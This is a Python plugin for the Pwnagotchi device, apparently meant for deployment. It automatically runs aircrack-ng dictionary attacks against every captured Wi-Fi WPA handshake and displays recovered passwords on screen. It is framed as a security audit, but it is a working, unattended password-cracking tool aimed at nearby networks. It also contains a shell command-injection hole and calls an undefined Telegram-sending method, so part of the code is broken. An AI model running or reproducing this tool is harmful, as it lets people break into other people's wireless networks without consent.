from pwnagotchi import plugins
import logging
import subprocess
import string
import re
import io
import os
import time
import json
from datetime import datetime

# This plugin is a modified version of the quickdic plugin.
# It is throttled to prevent it from using too much CPU. (built for pi zero 2w)
# It logs the security audit of estimated password strength to a file.
# It emits the cracked event for display-password.py to display the password on the screen.
# It sends the found passwords as qrcode and plain text over to telegram bot. (optional)
# Original quickdic plugin by ??? let me know if you know who the original author is. This is so 
# modified that it's essentially new code, but I will attribute if asked.
# Plugin will cycle through as many .txt files as you have in your wordlists/ starting with the 3 primary 
# files you set in your config.toml then it moves 3 files at a time, smallest to largest, with a 3 second wait between files.
# As a tool and for education, it also scores password strength based on how fast it was cracked if at all.
# I built it to run through my 665 .txt files without spiking the cpu to 100%. Enjoy!

class QuickDic(plugins.Plugin):
    __author__ = 'ZeroDumb'
    __version__ = '1.1.3'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes, display password on screen using display-password.py. Optionally send found passwords as qrcode and plain text over to telegram bot.'
    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }
    __defaults__ = {
        'enabled': True,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,
        'id': None,
        'max_cpu_percent': 80,  # Maximum CPU usage percentage
        'wordlists_per_batch': 3,  # Number of wordlists to process at once
        'batch_delay': 3,  # Delay between batches in seconds
        'priority_wordlists': ['rockyou-75.txt', 'darkc0de.txt', 'john-the-ripper.txt'],  # Most common wordlists first
        'security_log': '/home/pi/security_audit.log'
    }

    def __init__(self):
        self.text_to_set = ""
        self.current_batch = 0
        self.is_cracking = False
        self.start_time = None
        self.attempted_wordlists = set()
        self.total_passwords_checked = 0

    def on_loaded(self):
        logging.info('[quickdic_throttled] plugin loaded')

        if 'face' not in self.options:
            self.options['face'] = '(·ω·)'
        if 'wordlist_folder' not in self.options:
            self.options['wordlist_folder'] = '/home/pi/wordlists/'
        if 'enabled' not in self.options:
            self.options['enabled'] = False
        if 'api' not in self.options:
            self.options['api'] = None
        if 'id' not in self.options:
            self.options['id'] = None
        if 'max_cpu_percent' not in self.options:
            self.options['max_cpu_percent'] = 80
        if 'wordlists_per_batch' not in self.options:
            self.options['wordlists_per_batch'] = 5
        if 'batch_delay' not in self.options:
            self.options['batch_delay'] = 3
        if 'priority_wordlists' not in self.options:
            self.options['priority_wordlists'] = ['rockyou-75.txt', 'darkc0de.txt', 'john-the-ripper.txt']
        if 'security_log' not in self.options:
            self.options['security_log'] = '/home/pi/security_audit.log'
            
        # Check aircrack-ng installation
        check = subprocess.run(
            ('/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk \'{print $2, $3}\''), 
            shell=True, 
            stdout=subprocess.PIPE)
        check = check.stdout.decode('utf-8').strip()
        if check != "aircrack-ng <none>":
            logging.info('[quickdic] Found %s' %check)
        else:
            logging.warning('[quickdic] aircrack-ng is not installed!')

        # List and sort wordlists
        try:
            all_wordlists = [f for f in os.listdir(self.options['wordlist_folder']) if f.endswith('.txt')]
            
            # Sort wordlists: priority first, then by size (smallest first)
            priority_set = set(self.options['priority_wordlists'])
            priority_wordlists = [wl for wl in all_wordlists if wl in priority_set]
            other_wordlists = [wl for wl in all_wordlists if wl not in priority_set]
            
            # Sort other wordlists by size
            other_wordlists.sort(key=lambda x: os.path.getsize(os.path.join(self.options['wordlist_folder'], x)))
            
            self.wordlists = priority_wordlists + other_wordlists
            logging.info(f'[quickdic] Found {len(self.wordlists)} wordlists')
            logging.info(f'[quickdic] Priority wordlists: {", ".join(priority_wordlists)}')
            logging.info(f'[quickdic] Other wordlists: {len(other_wordlists)} files')
            
        except Exception as e:
            logging.error(f'[quickdic] Error listing wordlists: {str(e)}')
            self.wordlists = []

    def _get_current_cpu_usage(self):
        """Get current CPU usage percentage using top command"""
        try:
            cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}'"
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            cpu_usage = float(result.stdout.decode('utf-8').strip())
            return cpu_usage
        except Exception as e:
            logging.error(f'[quickdic] Error getting CPU usage: {str(e)}')
            return 0

    def _get_wordlist_size(self, wordlist):
        """Get number of lines in wordlist"""
        try:
            cmd = f"wc -l {os.path.join(self.options['wordlist_folder'], wordlist)}"
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            return int(result.stdout.decode('utf-8').split()[0])
        except:
            return 0

    def _log_security_audit(self, filename, bssid, result, time_taken, wordlists_checked):
        """Log security audit results"""
        try:
            audit_data = {
                'timestamp': datetime.now().isoformat(),
                'bssid': bssid,
                'result': result,
                'time_taken': time_taken,
                'wordlists_checked': wordlists_checked,
                'total_passwords_checked': self.total_passwords_checked,
                'security_score': self._calculate_security_score(result, time_taken, wordlists_checked)
            }
            
            with open(self.options['security_log'], 'a') as f:
                f.write(json.dumps(audit_data) + '\n')
                
            logging.info(f'[quickdic] Security audit logged to {self.options["security_log"]}')
        except Exception as e:
            logging.error(f'[quickdic] Error logging security audit: {str(e)}')

    def _calculate_security_score(self, result, time_taken, wordlists_checked):
        """Calculate a security score based on cracking attempt results"""
        if result == "KEY NOT FOUND":
            # Password wasn't found in the attempted wordlists
            base_score = 80
            
            # Bonus for time taken
            if time_taken > 3600:  # More than 1 hour
                base_score += 15
            elif time_taken > 1800:  # More than 30 minutes
                base_score += 10
            elif time_taken > 900:  # More than 15 minutes
                base_score += 5
                
            # Bonus for number of wordlists checked
            if wordlists_checked > 500:
                base_score += 15
            elif wordlists_checked > 300:
                base_score += 10
            elif wordlists_checked > 100:
                base_score += 5
                
            return min(100, base_score)
        else:
            # Password was found
            return 0

    def _process_wordlist_batch(self, filename, bssid, wordlist_batch):
        """Process a batch of wordlists"""
        wordlist_paths = [os.path.join(self.options['wordlist_folder'], wl) for wl in wordlist_batch]
        wordlist_str = ','.join(wordlist_paths)
        
        # Count passwords in this batch
        for wl in wordlist_batch:
            if wl not in self.attempted_wordlists:
                self.total_passwords_checked += self._get_wordlist_size(wl)
                self.attempted_wordlists.add(wl)
        
        cmd = f'aircrack-ng -w {wordlist_str} -l {filename}.cracked -q -b {bssid} {filename} | grep KEY'
        logging.info(f'[quickdic] Processing batch: {", ".join(wordlist_batch)}')
        
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
        return result.stdout.decode('utf-8').strip()

    def on_handshake(self, agent, filename, access_point, client_station):
        if self.is_cracking:
            logging.info('[quickdic] Already processing a handshake, skipping')
            return

        self.is_cracking = True
        self.start_time = time.time()
        display = agent.view()
        logging.info(f'[quickdic] Processing handshake file: {filename}')
        
        try:
            # Verify handshake
            result = subprocess.run(
                ('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                shell=True, 
                stdout=subprocess.PIPE)
            result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
            
            if not result:
                logging.info('[quickdic] No handshake found in file')
                self.is_cracking = False
                return

            logging.info(f'[quickdic] Handshake confirmed for BSSID: {result}')
            
            # Process wordlists in batches
            batch_size = self.options['wordlists_per_batch']
            total_wordlists = len(self.wordlists)
            wordlists_checked = 0
            
            for i in range(0, total_wordlists, batch_size):
                # Check CPU usage
                while self._get_current_cpu_usage() > self.options['max_cpu_percent']:
                    logging.info(f'[quickdic] CPU usage too high, waiting...')
                    time.sleep(5)
                
                # Get current batch of wordlists
                current_batch = self.wordlists[i:i + batch_size]
                wordlists_checked += len(current_batch)
                
                progress = (i + len(current_batch)) / total_wordlists * 100
                logging.info(f'[quickdic] Progress: {progress:.1f}% ({wordlists_checked}/{total_wordlists} wordlists)')
                
                # Process batch
                result2 = self._process_wordlist_batch(filename, result, current_batch)
                logging.info(f'[quickdic] Batch result: {result2}')
                
                if result2 != "KEY NOT FOUND":
                    key = re.search(r'\[(.*)\]', result2)
                    pwd = str(key.group(1))
                    self.text_to_set = "Cracked password: " + pwd
                    logging.warning(f'[quickdic] Password found: {pwd}')
                    display.set('face', self.options['face'])
                    display.set('status', self.text_to_set)
                    self.text_to_set = ""
                    display.update(force=True)
                    
                    # Emit cracked event for display-password.py
                    plugins.on('cracked', access_point, pwd)
                    
                    if self.options['id'] != None and self.options['api'] != None:
                        self._send_message(filename, pwd)
                    break
                
                # Wait between batches
                if i + batch_size < total_wordlists:
                    logging.info(f'[quickdic] Waiting {self.options["batch_delay"]} seconds before next batch')
                    time.sleep(self.options['batch_delay'])
            
            # Log security audit
            time_taken = time.time() - self.start_time
            self._log_security_audit(filename, result, result2, time_taken, wordlists_checked)
            
            if result2 == "KEY NOT FOUND":
                logging.info('[quickdic] No password found in any wordlist')
                
        except Exception as e:
            logging.error(f'[quickdic] Error during cracking: {str(e)}')
        finally:
            self.is_cracking = False 